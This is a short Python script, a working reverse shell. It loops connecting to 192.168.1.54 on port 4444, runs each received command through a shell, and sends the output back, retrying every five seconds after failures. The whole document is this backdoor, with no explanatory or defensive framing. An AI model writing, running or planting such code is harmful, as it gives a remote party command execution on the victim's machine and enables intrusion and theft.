import os, socket, subprocess, sys, time
while 1:
    try:
        s = socket.socket()
        s.connect(("192.168.1.54", 4444))
        while 1:
            c = s.recv(1024).decode()
            if c.lower() == "exit": 
                s.close(); 
                sys.exit()
            s.send(subprocess.run(c, shell=True, capture_output=True, text=True).stdout.encode())
    except:
        time.sleep(5)
